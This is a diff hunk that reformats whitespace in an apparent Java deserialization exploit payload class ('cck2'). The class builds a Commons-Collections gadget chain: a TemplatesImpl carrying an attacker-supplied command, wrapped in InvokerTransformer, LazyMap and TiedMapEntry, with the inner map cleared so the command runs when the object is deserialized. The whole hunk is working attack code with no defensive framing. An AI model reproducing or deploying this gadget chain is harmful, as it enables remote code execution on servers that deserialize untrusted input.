@@ -17,11 +17,11 @@ public class cck2 implements ReleaseableObjectPayload<Object> {
         final Object templates;
 
         templates = Gadgets.createTemplatesImpl(command);
-        InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-        HashMap<String, String> innerMap    = new HashMap<String, String>();
-        Map                     m           = LazyMap.lazyMap(innerMap, transformer);
-        Map                     outerMap    = new HashMap();
-        TiedMapEntry            tied        = new TiedMapEntry(m, templates);
+        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+        HashMap<String, String> innerMap = new HashMap<String, String>();
+        Map m = LazyMap.lazyMap(innerMap, transformer);
+        Map outerMap = new HashMap();
+        TiedMapEntry tied = new TiedMapEntry(m, templates);
         outerMap.put(tied, "t");
         // clear the inner map data, this is important
         innerMap.clear();
